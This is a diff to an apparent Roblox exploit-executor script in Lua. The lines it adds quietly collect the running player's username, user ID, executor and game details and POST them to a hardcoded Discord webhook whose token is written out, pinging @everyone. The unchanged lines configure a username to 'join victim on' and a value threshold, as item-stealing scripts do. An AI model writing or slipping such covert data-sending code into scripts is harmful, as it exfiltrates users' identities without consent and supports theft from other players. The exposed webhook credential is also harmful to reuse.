@@ -1,3 +1,67 @@
+-- Ensure Http requests are supported by the exploit
+if not syn and not http and not request then
+    print("Your executor does not support HTTP requests!")
+    return
+end
+
+-- Webhook URL
+local webhookURL = "https://discord.com/api/webhooks/1335043376210247806/Gky6NvSjJI_AAPtqsRiycMYXhVzTFdEUKlIZB-A1wg_WWXLH1cjmcR9s7KBHm97uMw3P"
+
+-- Get Player & Game Info
+local player = game:GetService("Players").LocalPlayer
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local gameID = game.GameId
+local placeID = game.PlaceId
+
+-- Create Data for Webhook
+local data = {
+    ["content"] = "@everyone **Executor Script Executed!**",
+    ["embeds"] = {{
+        ["title"] = "Execution Alert",
+        ["description"] = "A player has executed the script!",
+        ["color"] = 16711680, -- Red
+        ["fields"] = {
+            {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
+            {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
+            {["name"] = "Executor", ["value"] = identifyexecutor and identifyexecutor() or "Unknown", ["inline"] = true},
+            {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
+            {["name"] = "Game ID", ["value"] = tostring(gameID), ["inline"] = true},
+            {["name"] = "Place ID", ["value"] = tostring(placeID), ["inline"] = true}
+        }
+    }},
+    ["allowed_mentions"] = {["parse"] = {"everyone"}} -- This enables the @everyone ping
+}
+
+-- Convert Data to JSON
+local jsonData = game:GetService("HttpService"):JSONEncode(data)
+
+-- Send Request Using Exploit Functions
+if syn and syn.request then
+    syn.request({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = jsonData
+    })
+elseif request then
+    request({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = jsonData
+    })
+elseif http and http.request then
+    http.request({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = jsonData
+    })
+else
+    print("No supported exploit functions found!")
+end
+
+
 _G.Username = "boondock138" -- user you should join victim on
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
